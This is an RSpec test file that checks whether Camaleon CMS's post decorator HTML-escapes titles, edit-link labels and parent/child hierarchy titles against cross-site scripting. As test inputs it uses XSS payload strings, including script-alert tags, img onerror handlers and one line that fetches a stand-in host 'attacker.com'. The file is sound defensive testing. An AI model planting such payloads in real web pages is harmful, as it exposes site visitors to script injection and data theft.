# frozen_string_literal: true

require 'rails_helper'

RSpec.describe CamaleonCms::PostDecorator do
  let(:post) { create(:post, title: title) }
  let(:decorator) { post.decorate }

  describe '#the_title - XSS prevention' do
    let(:title) { 'Test Post' }

    it 'escapes HTML in post titles' do
      post.title = '<img src=x onerror=fetch(attacker.com)>'
      expect(decorator.the_title).to include('&lt;img')
    end

    it 'renders safe titles normally' do
      post.title = 'Safe Title'
      expect(decorator.the_title).to eq('Safe Title')
    end

    it 'escapes script tags' do
      post.title = '<script>alert(1)</script>'
      expect(decorator.the_title).not_to include('<script>')
      expect(decorator.the_title).to include('&lt;script&gt;')
    end
  end

  describe '#the_edit_link' do
    let(:title) { 'Editable Post' }

    it 'escapes the link label' do
      allow(decorator.h).to receive(:cama_current_user).and_return(instance_double(CamaleonCms::User))
      allow(decorator).to receive(:the_edit_url).and_return('/admin/posts/1/edit')

      output = decorator.the_edit_link('<script>alert(1)</script>')

      expect(output).to include('&lt;script&gt;alert(1)&lt;/script&gt;')
      expect(output).not_to include('<script>')
    end
  end

  describe '#the_hierarchy_title' do
    let(:title) { '<img src=x onerror=alert(1)>' }
    let(:parent_post) { create(:post, site: post.post_type.site, title: '<script>alert(1)</script>') }

    it 'escapes both child and parent titles' do
      post.update!(post_parent: parent_post.id)
      post.show_title_with_parent = true

      output = decorator.the_hierarchy_title

      expect(output).to include('&lt;img')
      expect(output).to include('&lt;script&gt;alert(1)&lt;/script&gt;')
      expect(output).not_to include('<img')
      expect(output).not_to include('<script>')
    end
  end
end
